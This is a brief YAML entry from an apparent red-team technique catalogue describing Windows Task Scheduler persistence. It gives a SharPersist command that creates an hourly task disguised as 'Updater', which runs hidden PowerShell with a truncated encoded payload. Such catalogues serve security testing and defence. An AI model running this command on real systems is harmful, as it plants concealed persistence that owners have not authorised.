title: Windows Task Scheduler persistence method
category: 
  - AD:
    - Persistence:
      - Host
tactic: Persistence
tags: []
description: 
  The Windows Task Scheduler allows us to create "tasks" that execute on a pre-determined trigger. 
  That trigger could be a time of day, on user-logon, when the computer goes idle, when the computer 
  is locked, or a combination thereof.

references:
  - https://github.com/mandiant/SharPersist

steps:
  - description: Create a new task
    options:
      - tool: SharPersist
        usage: SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAF..." -n "Updater" -m add -o hourly
  